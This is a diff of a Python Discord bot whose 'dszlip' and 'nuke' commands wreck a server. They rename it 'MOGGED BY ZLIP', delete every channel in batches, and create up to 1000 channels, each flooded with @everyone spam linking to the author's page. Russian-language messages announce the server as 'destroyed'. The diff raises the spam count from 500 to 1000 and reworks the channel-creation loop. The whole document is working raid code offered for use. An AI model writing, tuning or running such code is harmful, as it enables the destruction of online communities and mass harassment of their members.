@@ -49,18 +49,15 @@ async def dszlip(ctx):
     guild = ctx.guild
     start_time = time.time()
     
-    # Меняем название
     try:
         await guild.edit(name="MOGGED BY ZLIP")
     except:
         pass
     
-    # УДАЛЯЕМ ВСЕ КАНАЛЫ МАКСИМАЛЬНО БЫСТРО (ПАЧКАМИ ПО 200)
     print("🗑️ УДАЛЕНИЕ КАНАЛОВ...")
     
     channels = list(guild.channels)
     total = len(channels)
-    deleted = 0
     
     async def delete_channel(ch):
         try:
@@ -72,13 +69,11 @@ async def dszlip(ctx):
     batch_size = 200
     for i in range(0, total, batch_size):
         batch = channels[i:i+batch_size]
-        results = await asyncio.gather(*[delete_channel(ch) for ch in batch], return_exceptions=True)
-        deleted += sum(1 for r in results if r is True)
+        await asyncio.gather(*[delete_channel(ch) for ch in batch], return_exceptions=True)
     
-    print(f"✅ Удалено {deleted} каналов")
+    print(f"✅ Удалено {total} каналов")
     
-    # СОЗДАЕМ 500 КАНАЛОВ ПАРАЛЛЕЛЬНО
-    print("🔥 СОЗДАНИЕ 500 КАНАЛОВ...")
+    print("🔥 СОЗДАНИЕ 1000 КАНАЛОВ...")
     
     SPAM_TEXT = """@everyone
 **MOGGED BY ZLIP**
@@ -86,27 +81,26 @@ https://guns.lol/dszlip
 ВЫ УПАЛИ НА КОЛЕНИ"""
     
     created = 0
-    target = 500
+    target = 1000
     
-    async def create_and_spam(i):
+    for i in range(target):
         try:
             ch = await guild.create_text_channel(f"zlip-{i+1}")
-            messages = [ch.send(SPAM_TEXT) for _ in range(5)]
-            await asyncio.gather(*messages)
-            return True
-        except:
-            return False
-    
-    batch_size = 50  # 50 каналов ОДНОВРЕМЕННО
-    for i in range(0, target, batch_size):
-        batch = [create_and_spam(j) for j in range(i, min(i+batch_size, target))]
-        results = await asyncio.gather(*batch)
-        created += sum(results)
+            for _ in range(5):
+                await ch.send(SPAM_TEXT)
+            created += 1
+            
+            if (i + 1) % 50 == 0:
+                print(f"   📦 Создано {i+1}/{target} каналов")
+                
+        except Exception as e:
+            print(f"❌ Ошибка на канале {i+1}: {e}")
+            break
     
     elapsed = round(time.time() - start_time, 1)
     print(f"✅ Создано {created} каналов за {elapsed}с")
     
-    await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\nСоздано: {created} каналов\nВремя: {elapsed}с")
+    await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\nСоздано: {created} каналов\nСообщений: {created * 5}\nВремя: {elapsed}с")
 
 @bot.command()
 async def key(ctx):
@@ -166,19 +160,16 @@ async def nuke(ctx, guild_id: int = None):
     SPAM = "@everyone\nMOGGED BY ZLIP\nhttps://guns.lol/dszlip"
     
     created = 0
-    async def create(ch):
-        try:
-            c = await guild.create_text_channel(f"zlip-{ch+1}")
-            await asyncio.gather(*[c.send(SPAM) for _ in range(5)])
-            return True
-        except:
-            return False
+    target = 1000
     
-    batch_size = 50
-    for i in range(0, 500, batch_size):
-        batch = [create(j) for j in range(i, min(i+batch_size, 500))]
-        results = await asyncio.gather(*batch)
-        created += sum(results)
+    for i in range(target):
+        try:
+            ch = await guild.create_text_channel(f"zlip-{i+1}")
+            for _ in range(5):
+                await ch.send(SPAM)
+            created += 1
+        except:
+            break
     
     await ctx.send(f"✅ **{guild.name}** уничтожен\nСоздано: {created} каналов")
 
